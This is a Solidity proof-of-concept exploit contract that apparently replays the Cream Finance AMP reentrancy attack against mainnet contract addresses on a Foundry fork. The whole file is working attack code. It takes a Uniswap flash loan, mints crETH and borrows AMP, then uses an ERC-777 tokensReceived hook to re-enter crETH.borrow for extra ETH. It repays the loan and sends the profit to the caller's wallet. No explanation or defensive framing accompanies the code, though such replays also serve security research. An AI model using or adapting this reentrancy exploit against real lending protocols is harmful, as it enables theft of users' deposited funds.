// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.7.0 <0.9.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface AMP is IERC20 {}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface Uni_Pair_V2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface WETH9 is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface crETH {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external;
}

interface crAMP {
    function accrueInterest() external;
    function borrow(uint256 borrowAmount) external;
}

interface Uni_Router_V2 {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
}

contract Exploit {
    AMP internal amp;
    IERC1820Registry internal ierc1820;
    Uni_Pair_V2 internal uni;
    WETH9 internal weth;
    crETH internal creth;
    crAMP internal cramp;
    Uni_Router_V2 internal unirouterv2;
    CheatCodes internal cheats;
    address internal mywallet;
    address[] internal path;
    address internal uinWTH9Pair;
    address internal crETHAddress;
    address internal UniswapV2Router02;
    bytes32 internal tokensRecipientInterfaceHash;

    function run() external returns (uint256) {
        cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        cheats.createSelectFork("mainnet", 13125070);
        amp = AMP(0xfF20817765cB7f73d4bde2e66e067E58D11095C2);
        ierc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
        uni = Uni_Pair_V2(0xd3d2E2692501A5c9Ca623199D38826e513033a17);
        weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        creth = crETH(0xD06527D5e56A3495252A528C4987003b712860eE);
        cramp = crAMP(0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6);
        unirouterv2 = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uinWTH9Pair = 0xd3d2E2692501A5c9Ca623199D38826e513033a17;
        crETHAddress = 0xD06527D5e56A3495252A528C4987003b712860eE;
        UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        tokensRecipientInterfaceHash = 0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;
        path = new address[](2);
        path[0] = address(amp);
        path[1] = address(weth);
        payable(address(0)).transfer(address(this).balance);
        ierc1820.setInterfaceImplementer(address(this), tokensRecipientInterfaceHash, address(this));
        mywallet = msg.sender;
        uint256 start = weth.balanceOf(mywallet);
        uni.swap(0, 500 * 1e18, address(this), "0x00");
        uint256 end = weth.balanceOf(mywallet);
        return end > start ? end - start : 0;
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        weth.withdraw(500 * 1e18);
        creth.mint{value: 500 * 1e18}();
        creth.borrow(1 * 1e18);
        cramp.accrueInterest();
        cramp.borrow(19_480_000_000_000_000_000_000_000);
        weth.deposit{value: address(this).balance, gas: 40_000}();
        amp.approve(UniswapV2Router02, 19_480_000_000_000_000_000_000_000_000);
        unirouterv2.swapExactTokensForTokens(
            19_480_000_000_000_000_000_000_000,
            1,
            path,
            address(this),
            block.timestamp
        );
        weth.transfer(uinWTH9Pair, 502 * 1e18);
        weth.transfer(mywallet, weth.balanceOf(address(this)));
    }

    function tokensReceived(
        bytes4,
        bytes32,
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        crETH(crETHAddress).borrow(354 * 1e18);
    }

    receive() external payable {}
}
